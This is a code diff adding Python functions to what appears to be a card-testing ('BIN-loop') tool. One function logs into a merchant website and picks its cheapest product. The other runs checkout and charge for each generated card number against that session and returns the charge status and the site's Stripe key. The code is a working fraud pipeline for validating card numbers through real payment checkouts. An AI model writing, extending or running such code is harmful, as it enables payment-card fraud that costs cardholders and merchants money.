@@ -633,6 +633,58 @@ def checkout_and_charge(
     }
 
 
+def setup_wah_session(site_url: str, email: str, password: str) -> dict:
+    """
+    Phase 1 of the BIN-loop pipeline: validate URL, login, find cheapest product.
+    Returns {"ok": True, "session": s, "product": p, "site_url": url} on success
+    or {"ok": False, "error": "..."} on failure.
+    Call this once; pass the returned session+product to charge_wah_card() for
+    each generated card so login/product-scrape overhead is paid only once.
+    """
+    try:
+        site_url = _validate_url(site_url)
+    except ValueError as ve:
+        return {"ok": False, "error": f"Invalid URL: {ve}"}
+
+    session = _make_session()
+
+    login_result = login_to_site(session, site_url, email, password)
+    if not login_result["ok"]:
+        return {"ok": False, "error": f"Login failed: {login_result['error']}"}
+
+    product = find_cheapest_product(session, site_url)
+    if not product:
+        return {"ok": False, "error": "No products found on site"}
+
+    return {"ok": True, "session": session, "product": product, "site_url": site_url}
+
+
+def charge_wah_card(
+    session: "requests.Session",
+    site_url: str,
+    product: dict,
+    cc: str,
+    mm: str,
+    yy: str,
+    cvv: str,
+) -> dict:
+    """
+    Phase 2 of the BIN-loop pipeline: run checkout+charge for a single card
+    against an already-logged-in session with a known product.
+    Returns the same dict shape as run_wah() but without product_title/price
+    (caller already knows those from setup_wah_session).
+    """
+    start = time.time()
+    card = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+    charge_result = checkout_and_charge(session, site_url, product, card)
+    return {
+        "status": charge_result["status"],
+        "message": charge_result["message"],
+        "stripe_pk": charge_result.get("stripe_pk"),
+        "elapsed": round(time.time() - start, 2),
+    }
+
+
 def run_wah(site_url: str, email: str, password: str, cc: str, mm: str, yy: str, cvv: str) -> dict:
     """
     Full pipeline: validate URL → login → find cheapest product → checkout → charge.
